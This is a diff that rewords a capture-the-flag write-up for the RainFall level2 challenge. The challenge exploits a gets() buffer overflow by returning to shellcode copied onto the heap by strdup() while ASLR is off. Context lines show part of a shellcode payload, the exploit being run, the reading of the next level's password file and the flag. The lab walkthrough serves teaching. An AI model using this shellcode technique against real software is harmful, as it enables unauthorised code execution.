@@ -1,4 +1,4 @@
-As for the previous level, we have program that makes a call to gets(), which is vulnerable to buffer overflow attacks. But this time, a check is made to make sure that the return address of the function is not a stack address (using the 0xb0000000 mask). However, there is a call to strdup() which records the user's input on the heap and which we can exploit, since the address space layout randomization ([ASLR](https://www.networkworld.com/article/3331199/what-does-aslr-do-for-linux.html)) is off, meaning the memory addresses associated with running processes are predictable:
+As for the previous level, There is a program that makes a call to gets(), which is vulnerable to buffer overflow attacks. This time though, a check is made to make sure that the return address of the function is not a stack address (using the 0xb0000000 mask). However, there is a call to strdup() which records the user's input on the heap and which we can exploit, since the address space layout randomization ([ASLR](https://www.networkworld.com/article/3331199/what-does-aslr-do-for-linux.html)) is off, meaning the memory addresses associated with running processes are predictable:
 ```
 level2@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
 0
@@ -34,8 +34,7 @@ level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x7
 ```
 <br />
 
-Finally, we just have to launch the program by passing our crafted input:
-
+We can now run the program with our crafted input:
 ```
 level2@RainFall:~$ cat /tmp/exploit - | ./level2 
 1���
@@ -46,4 +45,4 @@ cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
-We can go to the next level with the command `su level3` and fill in the flag found as a password.
+We can now reach the next level with the command `su level3` and fill in the flag found as a password.
